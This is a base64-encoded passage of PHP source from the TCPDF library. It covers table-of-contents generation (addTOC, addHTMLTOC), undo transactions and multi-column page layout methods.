JaWYgKCRudW1maWxscyA+IDApIHsKCQkJCSRyb3dmaWxsID0gc3RyX3JlcGVhdCgkZmlsbGVyLCAkbnVtZmlsbHMpOwoJCQl9IGVsc2UgewoJCQkJJHJvd2ZpbGwgPSAnJzsKCQkJfQoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHBhZ2VudW0gPSAkcGFnZW51bS4kZ2FwLiRyb3dmaWxsOwoJCQl9IGVsc2UgewoJCQkJJHBhZ2VudW0gPSAkcm93ZmlsbC4kZ2FwLiRwYWdlbnVtOwoJCQl9CgkJCS8vIHdyaXRlIHRoZSBudW1iZXIKCQkJJHRoaXMtPkNlbGwoJHR3LCAwLCAkcGFnZW51bSwgMCwgMSwgJGFsaWdubnVtLCAwLCAkbGluaywgMCk7CgkJfQoJCSRwYWdlX2xhc3QgPSAkdGhpcy0+Z2V0UGFnZSgpOwoJCSRudW1wYWdlcyA9ICgkcGFnZV9sYXN0IC0gJHBhZ2VfZmlyc3QgKyAxKTsKCQkvLyBhY2NvdW50IGZvciBib29rbGV0IG1vZGUKCQlpZiAoJHRoaXMtPmJvb2tsZXQpIHsKCQkJLy8gY2hlY2sgaWYgYSBibGFuayBwYWdlIGlzIHJlcXVpcmVkIGJlZm9yZSBUT0MKCQkJJHBhZ2VfZmlsbF9zdGFydCA9ICgoKCRwYWdlX2ZpcnN0ICUgMikgPT0gMCkgWE9SICgoJHBhZ2UgJSAyKSA9PSAwKSk7CgkJCSRwYWdlX2ZpbGxfZW5kID0gKCEoKCgkbnVtcGFnZXMgJSAyKSA9PSAwKSBYT1IgKCRwYWdlX2ZpbGxfc3RhcnQpKSk7CgkJCWlmICgkcGFnZV9maWxsX3N0YXJ0KSB7CgkJCQkvLyBhZGQgYSBwYWdlIGF0IHRoZSBlbmQgKHRvIGJlIG1vdmVkIGJlZm9yZSBUT0MpCgkJCQkkdGhpcy0+YWRkUGFnZSgpOwoJCQkJKyskcGFnZV9sYXN0OwoJCQkJKyskbnVtcGFnZXM7CgkJCX0KCQkJaWYgKCRwYWdlX2ZpbGxfZW5kKSB7CgkJCQkvLyBhZGQgYSBwYWdlIGF0IHRoZSBlbmQKCQkJCSR0aGlzLT5hZGRQYWdlKCk7CgkJCQkrKyRwYWdlX2xhc3Q7CgkJCQkrKyRudW1wYWdlczsKCQkJfQoJCX0KCQkkbWF4cGFnZSA9IG1heCgkbWF4cGFnZSwgJHBhZ2VfbGFzdCk7CgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFnZSkpIHsKCQkJZm9yICgkcCA9ICRwYWdlX2ZpcnN0OyAkcCA8PSAkcGFnZV9sYXN0OyArKyRwKSB7CgkJCQkvLyBnZXQgcGFnZSBkYXRhCgkJCQkkdGVtcHBhZ2UgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkcCk7CgkJCQlmb3IgKCRuID0gMTsgJG4gPD0gJG1heHBhZ2U7ICsrJG4pIHsKCQkJCQkvLyB1cGRhdGUgcGFnZSBudW1iZXJzCgkJCQkJJGEgPSAneyMnLiRuLid9JzsKCQkJCQkvLyBnZXQgcGFnZSBudW1iZXIgYWxpYXNlcwoJCQkJCSRwbmFsaWFzID0gJHRoaXMtPmdldEludGVybmFsUGFnZU51bWJlckFsaWFzZXMoJGEpOwoJCQkJCS8vIGNhbGN1bGF0ZSByZXBsYWNlbWVudCBudW1iZXIKCQkJCQlpZiAoKCRuID49ICRwYWdlKSBBTkQgKCRuIDw9ICR0aGlzLT5udW1wYWdlcykpIHsKCQkJCQkJJG5wID0gJG4gKyAkbnVtcGFnZXM7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJG5wID0gJG47CgkJCQkJfQoJCQkJCSRuYSA9IFRDUERGX1NUQVRJQzo6Zm9ybWF0VE9DUGFnZU51bWJlcigoJHRoaXMtPnN0YXJ0aW5nX3BhZ2VfbnVtYmVyICsgJG5wIC0gMSkpOwoJCQkJCSRudSA9IFRDUERGX0ZPTlRTOjpVVEY4VG9VVEYxNkJFKCRuYSwgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJLy8gcmVwbGFjZSBhbGlhc2VzIHdpdGggbnVtYmVycwoJCQkJCWZvcmVhY2ggKCRwbmFsaWFzWyd1J10gYXMgJHUpIHsKCQkJCQkJJHNmaWxsID0gc3RyX3JlcGVhdCgkZmlsbGVyLCBtYXgoMCwgKHN0cmxlbigkdSkgLSBzdHJsZW4oJG51LicgJykpKSk7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkbnIgPSAkbnUuVENQREZfRk9OVFM6OlVURjhUb1VURjE2QkUoJyAnLiRzZmlsbCwgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkbnIgPSBUQ1BERl9GT05UUzo6VVRGOFRvVVRGMTZCRSgkc2ZpbGwuJyAnLCBmYWxzZSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KS4kbnU7CgkJCQkJCX0KCQkJCQkJJHRlbXBwYWdlID0gc3RyX3JlcGxhY2UoJHUsICRuciwgJHRlbXBwYWdlKTsKCQkJCQl9CgkJCQkJZm9yZWFjaCAoJHBuYWxpYXNbJ2EnXSBhcyAkYSkgewoJCQkJCQkkc2ZpbGwgPSBzdHJfcmVwZWF0KCRmaWxsZXIsIG1heCgwLCAoc3RybGVuKCRhKSAtIHN0cmxlbigkbmEuJyAnKSkpKTsKCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCSRuciA9ICRuYS4nICcuJHNmaWxsOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJG5yID0gJHNmaWxsLicgJy4kbmE7CgkJCQkJCX0KCQkJCQkJJHRlbXBwYWdlID0gc3RyX3JlcGxhY2UoJGEsICRuciwgJHRlbXBwYWdlKTsKCQkJCQl9CgkJCQl9CgkJCQkvLyBzYXZlIGNoYW5nZXMKCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCRwLCAkdGVtcHBhZ2UpOwoJCQl9CgkJCS8vIG1vdmUgcGFnZXMKCQkJJHRoaXMtPkJvb2ttYXJrKCR0b2NfbmFtZSwgMCwgMCwgJHBhZ2VfZmlyc3QsICRzdHlsZSwgJGNvbG9yKTsKCQkJaWYgKCRwYWdlX2ZpbGxfc3RhcnQpIHsKCQkJCSR0aGlzLT5tb3ZlUGFnZSgkcGFnZV9sYXN0LCAkcGFnZV9maXJzdCk7CgkJCX0KCQkJZm9yICgkaSA9IDA7ICRpIDwgJG51bXBhZ2VzOyArKyRpKSB7CgkJCQkkdGhpcy0+bW92ZVBhZ2UoJHBhZ2VfbGFzdCwgJHBhZ2UpOwoJCQl9CgkJfQoJfQoKCS8qKgoJICogT3V0cHV0IGEgVGFibGUgT2YgQ29udGVudCBJbmRleCAoVE9DKSB1c2luZyBIVE1MIHRlbXBsYXRlcy4KCSAqIFRoaXMgbWV0aG9kIG11c3QgYmUgY2FsbGVkIGFmdGVyIGFsbCBCb29rbWFya3Mgd2VyZSBzZXQuCgkgKiBCZWZvcmUgY2FsbGluZyB0aGlzIG1ldGhvZCB5b3UgaGF2ZSB0byBvcGVuIHRoZSBwYWdlIHVzaW5nIHRoZSBhZGRUT0NQYWdlKCkgbWV0aG9kLgoJICogQWZ0ZXIgY2FsbGluZyB0aGlzIG1ldGhvZCB5b3UgaGF2ZSB0byBjYWxsIGVuZFRPQ1BhZ2UoKSB0byBjbG9zZSB0aGUgVE9DIHBhZ2UuCgkgKiBAcGFyYW0gaW50fG51bGwgJHBhZ2UgcGFnZSBudW1iZXIgd2hlcmUgdGhpcyBUT0Mgc2hvdWxkIGJlIGluc2VydGVkIChsZWF2ZSBlbXB0eSBmb3IgY3VycmVudCBwYWdlKS4KCSAqIEBwYXJhbSBzdHJpbmcgJHRvY19uYW1lIG5hbWUgdG8gdXNlIGZvciBUT0MgYm9va21hcmsuCgkgKiBAcGFyYW0gYXJyYXkgJHRlbXBsYXRlcyBhcnJheSBvZiBodG1sIHRlbXBsYXRlcy4gVXNlOiAiI1RPQ19ERVNDUklQVElPTiMiIGZvciBib29rbWFyayB0aXRsZSwgIiNUT0NfUEFHRV9OVU1CRVIjIiBmb3IgcGFnZSBudW1iZXIuCgkgKiBAcGFyYW0gYm9vbGVhbiAkY29ycmVjdF9hbGlnbiBpZiB0cnVlIGNvcnJlY3QgdGhlIG51bWJlciBhbGlnbm1lbnQgKG51bWJlcnMgbXVzdCBiZSBpbiBtb25vc3BhY2VkIGZvbnQgbGlrZSBjb3VyaWVyIGFuZCByaWdodCBhbGlnbmVkIG9uIExUUiwgb3IgbGVmdCBhbGlnbmVkIG9uIFJUTCkKCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIEZvbnQgc3R5bGUgZm9yIHRpdGxlOiBCID0gQm9sZCwgSSA9IEl0YWxpYywgQkkgPSBCb2xkICsgSXRhbGljLgoJICogQHBhcmFtIGFycmF5ICRjb2xvciBSR0IgY29sb3IgYXJyYXkgZm9yIHRpdGxlICh2YWx1ZXMgZnJvbSAwIHRvIDI1NSkuCgkgKiBAcHVibGljCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDUuMC4wMDEgKDIwMTAtMDUtMDYpCgkgKiBAc2VlIGFkZFRPQ1BhZ2UoKSwgZW5kVE9DUGFnZSgpLCBhZGRUT0MoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gYWRkSFRNTFRPQygkcGFnZT1udWxsLCAkdG9jX25hbWU9J1RPQycsICR0ZW1wbGF0ZXM9YXJyYXkoKSwgJGNvcnJlY3RfYWxpZ249dHJ1ZSwgJHN0eWxlPScnLCAkY29sb3I9YXJyYXkoMCwwLDApKSB7CgkJJGZpbGxlciA9ICcgJzsKCQkkcHJldl9odG1sTGlua0NvbG9yQXJyYXkgPSAkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5OwoJCSRwcmV2X2h0bWxMaW5rRm9udFN0eWxlID0gJHRoaXMtPmh0bWxMaW5rRm9udFN0eWxlOwoJCS8vIHNldCBuZXcgc3R5bGUgZm9yIGxpbmsKCQkkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5ID0gYXJyYXkoKTsKCQkkdGhpcy0+aHRtbExpbmtGb250U3R5bGUgPSAnJzsKCQkkcGFnZV9maXJzdCA9ICR0aGlzLT5nZXRQYWdlKCk7CgkJJHBhZ2VfZmlsbF9zdGFydCA9IGZhbHNlOwoJCSRwYWdlX2ZpbGxfZW5kID0gZmFsc2U7CgkJLy8gZ2V0IHRoZSBmb250IHR5cGUgdXNlZCBmb3IgbnVtYmVycyBpbiBlYWNoIHRlbXBsYXRlCgkJJGN1cnJlbnRfZm9udCA9ICR0aGlzLT5Gb250RmFtaWx5OwoJCWZvcmVhY2ggKCR0ZW1wbGF0ZXMgYXMgJGxldmVsID0+ICRodG1sKSB7CgkJCSRkb20gPSAkdGhpcy0+Z2V0SHRtbERvbUFycmF5KCRodG1sKTsKCQkJZm9yZWFjaCAoJGRvbSBhcyAka2V5ID0+ICR2YWx1ZSkgewoJCQkJaWYgKCR2YWx1ZVsndmFsdWUnXSA9PSAnI1RPQ19QQUdFX05VTUJFUiMnKSB7CgkJCQkJJHRoaXMtPnNldEZvbnQoJGRvbVsoJGtleSAtIDEpXVsnZm9udG5hbWUnXSk7CgkJCQkJJHRlbXBsYXRlc1snRicuJGxldmVsXSA9ICR0aGlzLT5pc1VuaWNvZGVGb250KCk7CgkJCQl9CgkJCX0KCQl9CgkJJHRoaXMtPnNldEZvbnQoJGN1cnJlbnRfZm9udCk7CgkJJG1heHBhZ2UgPSAwOyAvL3VzZWQgZm9yIHBhZ2VzIG9uIGF0dGFjaGVkIGRvY3VtZW50cwoJCWZvcmVhY2ggKCR0aGlzLT5vdXRsaW5lcyBhcyAka2V5ID0+ICRvdXRsaW5lKSB7CgkJCS8vIGdldCBIVE1MIHRlbXBsYXRlCgkJCSRyb3cgPSAkdGVtcGxhdGVzWyRvdXRsaW5lWydsJ11dOwoJCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHBhZ2UpKSB7CgkJCQkkcGFnZW51bSA9ICRvdXRsaW5lWydwJ107CgkJCX0gZWxzZSB7CgkJCQkvLyBwbGFjZW1hcmsgdG8gYmUgcmVwbGFjZWQgd2l0aCB0aGUgY29ycmVjdCBudW1iZXIKCQkJCSRwYWdlbnVtID0gJ3sjJy4oJG91dGxpbmVbJ3AnXSkuJ30nOwoJCQkJaWYgKGlzc2V0KCR0ZW1wbGF0ZXNbJ0YnLiRvdXRsaW5lWydsJ11dKSAmJiAkdGVtcGxhdGVzWydGJy4kb3V0bGluZVsnbCddXSkgewoJCQkJCSRwYWdlbnVtID0gJ3snLiRwYWdlbnVtLid9JzsKCQkJCX0KCQkJCSRtYXhwYWdlID0gbWF4KCRtYXhwYWdlLCAkb3V0bGluZVsncCddKTsKCQkJfQoJCQkvLyByZXBsYWNlIHRlbXBsYXRlcyB3aXRoIGN1cnJlbnQgdmFsdWVzCgkJCSRyb3cgPSBzdHJfcmVwbGFjZSgnI1RPQ19ERVNDUklQVElPTiMnLCAkb3V0bGluZVsndCddLCAkcm93KTsKCQkJJHJvdyA9IHN0cl9yZXBsYWNlKCcjVE9DX1BBR0VfTlVNQkVSIycsICRwYWdlbnVtLCAkcm93KTsKCQkJLy8gYWRkIGxpbmsgdG8gcGFnZQoJCQkkcm93ID0gJzxhIGhyZWY9IiMnLiRvdXRsaW5lWydwJ10uJywnLiRvdXRsaW5lWyd5J10uJyI+Jy4kcm93Lic8L2E+JzsKCQkJLy8gd3JpdGUgYm9va21hcmsgZW50cnkKCQkJJHRoaXMtPndyaXRlSFRNTCgkcm93LCBmYWxzZSwgZmFsc2UsIHRydWUsIGZhbHNlLCAnJyk7CgkJfQoJCS8vIHJlc3RvcmUgbGluayBzdHlsZXMKCQkkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5ID0gJHByZXZfaHRtbExpbmtDb2xvckFycmF5OwoJCSR0aGlzLT5odG1sTGlua0ZvbnRTdHlsZSA9ICRwcmV2X2h0bWxMaW5rRm9udFN0eWxlOwoJCS8vIG1vdmUgVE9DIHBhZ2UgYW5kIHJlcGxhY2UgbnVtYmVycwoJCSRwYWdlX2xhc3QgPSAkdGhpcy0+Z2V0UGFnZSgpOwoJCSRudW1wYWdlcyA9ICgkcGFnZV9sYXN0IC0gJHBhZ2VfZmlyc3QgKyAxKTsKCQkvLyBhY2NvdW50IGZvciBib29rbGV0IG1vZGUKCQlpZiAoJHRoaXMtPmJvb2tsZXQpIHsKCQkJLy8gY2hlY2sgaWYgYSBibGFuayBwYWdlIGlzIHJlcXVpcmVkIGJlZm9yZSBUT0MKCQkJJHBhZ2VfZmlsbF9zdGFydCA9ICgoKCRwYWdlX2ZpcnN0ICUgMikgPT0gMCkgWE9SICgoJHBhZ2UgJSAyKSA9PSAwKSk7CgkJCSRwYWdlX2ZpbGxfZW5kID0gKCEoKCgkbnVtcGFnZXMgJSAyKSA9PSAwKSBYT1IgKCRwYWdlX2ZpbGxfc3RhcnQpKSk7CgkJCWlmICgkcGFnZV9maWxsX3N0YXJ0KSB7CgkJCQkvLyBhZGQgYSBwYWdlIGF0IHRoZSBlbmQgKHRvIGJlIG1vdmVkIGJlZm9yZSBUT0MpCgkJCQkkdGhpcy0+YWRkUGFnZSgpOwoJCQkJKyskcGFnZV9sYXN0OwoJCQkJKyskbnVtcGFnZXM7CgkJCX0KCQkJaWYgKCRwYWdlX2ZpbGxfZW5kKSB7CgkJCQkvLyBhZGQgYSBwYWdlIGF0IHRoZSBlbmQKCQkJCSR0aGlzLT5hZGRQYWdlKCk7CgkJCQkrKyRwYWdlX2xhc3Q7CgkJCQkrKyRudW1wYWdlczsKCQkJfQoJCX0KCQkkbWF4cGFnZSA9IG1heCgkbWF4cGFnZSwgJHBhZ2VfbGFzdCk7CgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkcGFnZSkpIHsKCQkJZm9yICgkcCA9ICRwYWdlX2ZpcnN0OyAkcCA8PSAkcGFnZV9sYXN0OyArKyRwKSB7CgkJCQkvLyBnZXQgcGFnZSBkYXRhCgkJCQkkdGVtcHBhZ2UgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkcCk7CgkJCQlmb3IgKCRuID0gMTsgJG4gPD0gJG1heHBhZ2U7ICsrJG4pIHsKCQkJCQkvLyB1cGRhdGUgcGFnZSBudW1iZXJzCgkJCQkJJGEgPSAneyMnLiRuLid9JzsKCQkJCQkvLyBnZXQgcGFnZSBudW1iZXIgYWxpYXNlcwoJCQkJCSRwbmFsaWFzID0gJHRoaXMtPmdldEludGVybmFsUGFnZU51bWJlckFsaWFzZXMoJGEpOwoJCQkJCS8vIGNhbGN1bGF0ZSByZXBsYWNlbWVudCBudW1iZXIKCQkJCQlpZiAoJG4gPj0gJHBhZ2UpIHsKCQkJCQkJJG5wID0gJG4gKyAkbnVtcGFnZXM7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJG5wID0gJG47CgkJCQkJfQoJCQkJCSRuYSA9IFRDUERGX1NUQVRJQzo6Zm9ybWF0VE9DUGFnZU51bWJlcigoJHRoaXMtPnN0YXJ0aW5nX3BhZ2VfbnVtYmVyICsgJG5wIC0gMSkpOwoJCQkJCSRudSA9IFRDUERGX0ZPTlRTOjpVVEY4VG9VVEYxNkJFKCRuYSwgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJLy8gcmVwbGFjZSBhbGlhc2VzIHdpdGggbnVtYmVycwoJCQkJCWZvcmVhY2ggKCRwbmFsaWFzWyd1J10gYXMgJHUpIHsKCQkJCQkJaWYgKCRjb3JyZWN0X2FsaWduKSB7CgkJCQkJCQkkc2ZpbGwgPSBzdHJfcmVwZWF0KCRmaWxsZXIsIChzdHJsZW4oJHUpIC0gc3RybGVuKCRudS4nICcpKSk7CgkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCSRuciA9ICRudS5UQ1BERl9GT05UUzo6VVRGOFRvVVRGMTZCRSgnICcuJHNmaWxsLCBmYWxzZSwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJG5yID0gVENQREZfRk9OVFM6OlVURjhUb1VURjE2QkUoJHNmaWxsLicgJywgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCkuJG51OwoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJG5yID0gJG51OwoJCQkJCQl9CgkJCQkJCSR0ZW1wcGFnZSA9IHN0cl9yZXBsYWNlKCR1LCAkbnIsICR0ZW1wcGFnZSk7CgkJCQkJfQoJCQkJCWZvcmVhY2ggKCRwbmFsaWFzWydhJ10gYXMgJGEpIHsKCQkJCQkJaWYgKCRjb3JyZWN0X2FsaWduKSB7CgkJCQkJCQkkc2ZpbGwgPSBzdHJfcmVwZWF0KCRmaWxsZXIsIChzdHJsZW4oJGEpIC0gc3RybGVuKCRuYS4nICcpKSk7CgkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCSRuciA9ICRuYS4nICcuJHNmaWxsOwoJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkkbnIgPSAkc2ZpbGwuJyAnLiRuYTsKCQkJCQkJCX0KCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRuciA9ICRuYTsKCQkJCQkJfQoJCQkJCQkkdGVtcHBhZ2UgPSBzdHJfcmVwbGFjZSgkYSwgJG5yLCAkdGVtcHBhZ2UpOwoJCQkJCX0KCQkJCX0KCQkJCS8vIHNhdmUgY2hhbmdlcwoJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHAsICR0ZW1wcGFnZSk7CgkJCX0KCQkJLy8gbW92ZSBwYWdlcwoJCQkkdGhpcy0+Qm9va21hcmsoJHRvY19uYW1lLCAwLCAwLCAkcGFnZV9maXJzdCwgJHN0eWxlLCAkY29sb3IpOwoJCQlpZiAoJHBhZ2VfZmlsbF9zdGFydCkgewoJCQkJJHRoaXMtPm1vdmVQYWdlKCRwYWdlX2xhc3QsICRwYWdlX2ZpcnN0KTsKCQkJfQoJCQlmb3IgKCRpID0gMDsgJGkgPCAkbnVtcGFnZXM7ICsrJGkpIHsKCQkJCSR0aGlzLT5tb3ZlUGFnZSgkcGFnZV9sYXN0LCAkcGFnZSk7CgkJCX0KCQl9Cgl9CgoJLyoqCgkgKiBTdG9yZXMgYSBjb3B5IG9mIHRoZSBjdXJyZW50IFRDUERGIG9iamVjdCB1c2VkIGZvciB1bmRvIG9wZXJhdGlvbi4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjUuMDI5ICgyMDA5LTAzLTE5KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc3RhcnRUcmFuc2FjdGlvbigpIHsKCQlpZiAoaXNzZXQoJHRoaXMtPm9iamNvcHkpKSB7CgkJCS8vIHJlbW92ZSBwcmV2aW91cyBjb3B5CgkJCSR0aGlzLT5jb21taXRUcmFuc2FjdGlvbigpOwoJCX0KCQkvLyByZWNvcmQgY3VycmVudCBwYWdlIG51bWJlciBhbmQgWSBwb3NpdGlvbgoJCSR0aGlzLT5zdGFydF90cmFuc2FjdGlvbl9wYWdlID0gJHRoaXMtPnBhZ2U7CgkJJHRoaXMtPnN0YXJ0X3RyYW5zYWN0aW9uX3kgPSAkdGhpcy0+eTsKCQkvLyBjbG9uZSBjdXJyZW50IG9iamVjdAoJCSR0aGlzLT5vYmpjb3B5ID0gVENQREZfU1RBVElDOjpvYmpjbG9uZSgkdGhpcyk7Cgl9CgoJLyoqCgkgKiBEZWxldGUgdGhlIGNvcHkgb2YgdGhlIGN1cnJlbnQgVENQREYgb2JqZWN0IHVzZWQgZm9yIHVuZG8gb3BlcmF0aW9uLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNS4wMjkgKDIwMDktMDMtMTkpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBjb21taXRUcmFuc2FjdGlvbigpIHsKCQlpZiAoaXNzZXQoJHRoaXMtPm9iamNvcHkpKSB7CgkJCSR0aGlzLT5vYmpjb3B5LT5fZGVzdHJveSh0cnVlLCB0cnVlKTsKCQkJLyogVGhlIHVuaXF1ZSBmaWxlX2lkIHNob3VsZCBub3QgYmUgdXNlZCBkdXJpbmcgY2xlYW51cCBhZ2FpbiAqLwoJCQkkdGhpcy0+b2JqY29weS0+ZmlsZV9pZCA9IE5VTEw7CgkJCXVuc2V0KCR0aGlzLT5vYmpjb3B5KTsKCQl9Cgl9CgoJLyoqCgkgKiBUaGlzIG1ldGhvZCBhbGxvd3MgdG8gdW5kbyB0aGUgbGF0ZXN0IHRyYW5zYWN0aW9uIGJ5IHJldHVybmluZyB0aGUgbGF0ZXN0IHNhdmVkIFRDUERGIG9iamVjdCB3aXRoIHN0YXJ0VHJhbnNhY3Rpb24oKS4KCSAqIEBwYXJhbSBib29sZWFuICRzZWxmIGlmIHRydWUgcmVzdG9yZXMgY3VycmVudCBjbGFzcyBvYmplY3QgdG8gcHJldmlvdXMgc3RhdGUgd2l0aG91dCB0aGUgbmVlZCBvZiByZWFzc2lnbm1lbnQgdmlhIHRoZSByZXR1cm5lZCB2YWx1ZS4KCSAqIEByZXR1cm4gVENQREYgb2JqZWN0LgoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuNS4wMjkgKDIwMDktMDMtMTkpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiByb2xsYmFja1RyYW5zYWN0aW9uKCRzZWxmPWZhbHNlKSB7CgkJaWYgKCFpc3NldCgkdGhpcy0+b2JqY29weSkpIHsKCQkJcmV0dXJuICR0aGlzOwoJCX0KCQkkZmlsZV9pZCA9ICR0aGlzLT5maWxlX2lkOwoJCSRvYmpjb3B5ID0gJHRoaXMtPm9iamNvcHk7CgkJJHRoaXMtPl9kZXN0cm95KHRydWUsIHRydWUpOwoJCWlmICgkc2VsZikgewoJCQkkb2JqdmFycyA9IGdldF9vYmplY3RfdmFycygkb2JqY29weSk7CgkJCWZvcmVhY2ggKCRvYmp2YXJzIGFzICRrZXkgPT4gJHZhbHVlKSB7CgkJCQkkdGhpcy0+JGtleSA9ICR2YWx1ZTsKCQkJfQoJCQkkb2JqY29weS0+X2Rlc3Ryb3kodHJ1ZSwgdHJ1ZSk7CgkJCXVuc2V0KCRvYmpjb3B5KTsKCQkJcmV0dXJuICR0aGlzOwoJCX0KCQkkdGhpcy0+ZmlsZV9pZCA9ICRmaWxlX2lkOwoJCXJldHVybiAkb2JqY29weTsKCX0KCgkvLyAtLS0gTVVMVEkgQ09MVU1OUyBNRVRIT0RTIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoJLyoqCgkgKiBTZXQgbXVsdGlwbGUgY29sdW1ucyBvZiB0aGUgc2FtZSBzaXplCgkgKiBAcGFyYW0gaW50ICRudW1jb2xzIG51bWJlciBvZiBjb2x1bW5zIChzZXQgdG8gemVybyB0byBkaXNhYmxlIGNvbHVtbnMgbW9kZSkKCSAqIEBwYXJhbSBpbnQgJHdpZHRoIGNvbHVtbiB3aWR0aAoJICogQHBhcmFtIGludHxudWxsICR5IGNvbHVtbiBzdGFydGluZyBZIHBvc2l0aW9uIChsZWF2ZSBlbXB0eSBmb3IgY3VycmVudCBZIHBvc2l0aW9uKQoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuOS4wMDEgKDIwMTAtMDMtMjgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRFcXVhbENvbHVtbnMoJG51bWNvbHM9MCwgJHdpZHRoPTAsICR5PW51bGwpIHsKCQkkdGhpcy0+Y29sdW1ucyA9IGFycmF5KCk7CgkJaWYgKCRudW1jb2xzIDwgMikgewoJCQkkbnVtY29scyA9IDA7CgkJCSR0aGlzLT5jb2x1bW5zID0gYXJyYXkoKTsKCQl9IGVsc2UgewoJCQkvLyBtYXhpbXVtIGNvbHVtbiB3aWR0aAoJCQkkbWF4d2lkdGggPSAoJHRoaXMtPncgLSAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiAtICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luKSAvICRudW1jb2xzOwoJCQlpZiAoKCR3aWR0aCA9PSAwKSBPUiAoJHdpZHRoID4gJG1heHdpZHRoKSkgewoJCQkJJHdpZHRoID0gJG1heHdpZHRoOwoJCQl9CgkJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJCSR5ID0gJHRoaXMtPnk7CgkJCX0KCQkJLy8gc3BhY2UgYmV0d2VlbiBjb2x1bW5zCgkJCSRzcGFjZSA9ICgoJHRoaXMtPncgLSAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiAtICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luIC0gKCRudW1jb2xzICogJHdpZHRoKSkgLyAoJG51bWNvbHMgLSAxKSk7CgkJCS8vIGZpbGwgdGhlIGNvbHVtbnMgYXJyYXkgKHdpdGgsIHNwYWNlLCBzdGFydGluZyBZIHBvc2l0aW9uKQoJCQlmb3IgKCRpID0gMDsgJGkgPCAkbnVtY29sczsgKyskaSkgewoJCQkJJHRoaXMtPmNvbHVtbnNbJGldID0gYXJyYXkoJ3cnID0+ICR3aWR0aCwgJ3MnID0+ICRzcGFjZSwgJ3knID0+ICR5KTsKCQkJfQoJCX0KCQkkdGhpcy0+bnVtX2NvbHVtbnMgPSAkbnVtY29sczsKCQkkdGhpcy0+Y3VycmVudF9jb2x1bW4gPSAwOwoJCSR0aGlzLT5jb2x1bW5fc3RhcnRfcGFnZSA9ICR0aGlzLT5wYWdlOwoJCSR0aGlzLT5zZWxlY3RDb2x1bW4oMCk7Cgl9CgoJLyoqCgkgKiBSZW1vdmUgY29sdW1ucyBhbmQgcmVzZXQgcGFnZSBtYXJnaW5zLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wNzIgKDIwMTEtMDQtMjYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiByZXNldENvbHVtbnMoKSB7CgkJJHRoaXMtPmxNYXJnaW4gPSAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbjsKCQkkdGhpcy0+ck1hcmdpbiA9ICR0aGlzLT5vcmlnaW5hbF9yTWFyZ2luOwoJCSR0aGlzLT5zZXRFcXVhbENvbHVtbnMoKTsKCX0KCgkvKioKCSAqIFNldCBjb2x1bW5zIGFycmF5LgoJICogRWFjaCBjb2x1bW4gaXMgcmVwcmVzZW50ZWQgYnkgYW4gYXJyYXkgb2YgYXJyYXlzIHdpdGggdGhlIGZvbGxvd2luZyBrZXlzOiAodyA9IHdpZHRoLCBzID0gc3BhY2UgYmV0d2VlbiBjb2x1bW5zLCB5ID0gY29sdW1uIHRvcCBwb3NpdGlvbikuCgkgKiBAcGFyYW0gYXJyYXkgJGNvbHVtbnMKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjkuMDAxICgyMDEwLTAzLTI4KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0Q29sdW1uc0FycmF5KCRjb2x1bW5zKSB7CgkJJHRoaXMtPmNvbHVtbnMgPSAkY29sdW1uczsKCQkkdGhpcy0+bnVtX2NvbHVtbnM